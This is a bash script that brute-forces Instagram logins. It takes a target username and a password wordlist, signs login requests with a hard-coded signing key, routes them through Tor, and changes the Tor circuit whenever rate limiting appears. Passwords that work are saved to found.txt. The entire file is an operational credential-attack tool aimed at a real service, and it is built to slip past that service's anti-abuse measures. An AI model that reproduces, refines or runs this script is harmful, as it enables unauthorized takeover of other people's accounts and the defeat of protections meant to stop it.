#!/bin/bash
# Fixed and Combined Version
# Coded by: Khalid Husain

trap 'exit 1' 2

# --- 1. The Banner ---
banner() {
    clear
    printf "\e[1;92m"
    printf "  ░█─▄▀ █──█ █▀▀█ █── ─▀─ █▀▀▄ 　 ░█─░█ █──█ █▀▀ █▀▀█ ─▀─ █▀▀▄\n"
    printf "  ░█▀▄─ █▀▀█ █▄▄█ █── ▀█▀ █──█ 　 ░█▀▀█ █──█ ▀▀█ █▄▄█ ▀█▀ █──█\n"
    printf "  ░█─░█ ▀──▀ ▀──▀ ▀▀▀ ▀▀▀ ▀▀▀─ 　 ░█─░█ ─▀▀▀ ▀▀▀ ▀──▀ ▀▀▀ ▀──▀\n"
    printf "\e[1;77m\e[45m   EXPECTATIONS ALWAYS HURT, SO BE CAREFUL {{Khalid Husain}}   \e[0m\n\n"
}

# --- 2. Security & Dependencies ---
checkroot() {
    if [[ "$(id -u)" -ne 0 ]]; then
        printf "\e[1;77mPlease, run this program as root (sudo)!\n\e[0m"
        exit 1
    fi
}

dependencies() {
    for cmd in tor curl openssl awk sed cat tr wc cut uniq; do
        command -v $cmd > /dev/null 2>&1 || { echo >&2 "I require $cmd but it's not installed. Aborting."; exit 1; }
    done
}

# --- 3. Fixing the Token ---
get_token() {
    uuid=$(openssl rand -hex 16)
    # We capture the response headers to find the csrftoken cookie
    response=$(curl -s -i "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
    token=$(echo "$response" | grep -i "set-cookie: csrftoken=" | cut -d "=" -f2 | cut -d ";" -f1)
    echo "$token"
}

function changeip() {
    printf "\e[1;91m[!] Changing Tor Circuit for new IP...\e[0m\n"
    killall -HUP tor 2>/dev/null
    sleep 3
}

# --- 4. Main Program Logic ---
function start() {
    banner
    checkroot
    dependencies
    
    read -p $'\e[1;92mUsername account: \e[0m' user
    if [[ -z "$user" ]]; then
        printf "\e[1;91mUsername cannot be empty!\e[0m\n"
        exit 1
    fi
    
    default_wl_pass="passwords.lst"
    read -p $'\e[1;92mPassword List (Default: passwords.lst): \e[0m' wl_pass
    wl_pass="${wl_pass:-${default_wl_pass}}"
    
    if [[ ! -f "$wl_pass" ]]; then
        printf "\e[1;91mWordlist file not found!\e[0m\n"
        exit 1
    fi
}

function bruteforcer() {
    csrftoken=$(get_token)
    if [[ -z "$csrftoken" ]]; then 
        printf "\e[1;91m[!] Error: Could not get CSRF Token. Is Tor running?\e[0m\n"
        exit 1
    fi
    
    count_pass=$(wc -l < "$wl_pass")
    printf "\e[1;92m[*] Target: $user | Wordlist: $wl_pass ($count_pass passwords)\e[0m\n"
    printf "\e[1;92m[*] Token: $csrftoken\e[0m\n\n"
    
    while IFS= read -r pass; do
        pass=$(echo "$pass" | tr -d '\r\n')
        
        uuid=$(openssl rand -hex 16)
        device="android-$(openssl rand -hex 8)"
        
        # Build the JSON data correctly
        data="{\"phone_id\":\"$uuid\", \"_csrftoken\":\"$csrftoken\", \"username\":\"$user\", \"guid\":\"$uuid\", \"device_id\":\"$device\", \"password\":\"$pass\", \"login_attempt_count\":\"0\"}"
        
        # Instagram Signing
        ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$ig_sig" | cut -d " " -f2)
        
        printf "\e[1;77mTrying: %s\e[0m\n" "$pass"
        
        # Execute the login request
        check=$(curl --socks5-hostname 127.0.0.1:9050 -s \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -A "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)" \
            -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
            "https://i.instagram.com/api/v1/accounts/login/")

        if [[ $check == *"logged_in_user"* ]]; then
            printf "\e[1;92m\n[+] Success! Password Found: %s\n" "$pass"
            echo "User: $user Pass: $pass" >> found.txt
            exit 0
        elif [[ $check == *"challenge"* ]]; then
            printf "\e[1;93m\n[!] Success! Found: %s (But verification/challenge is required)\n" "$pass"
            echo "User: $user Pass: $pass [CHALLENGE]" >> found.txt
            exit 0
        elif [[ $check == *"Please wait"* || $check == *"many tries"* ]]; then
            printf "\e[1;91m[!] Rate Limit Detected.\e[0m\n"
            changeip
            csrftoken=$(get_token)
        fi
    done < "$wl_pass"
}

# --- Execution ---
start
bruteforcer
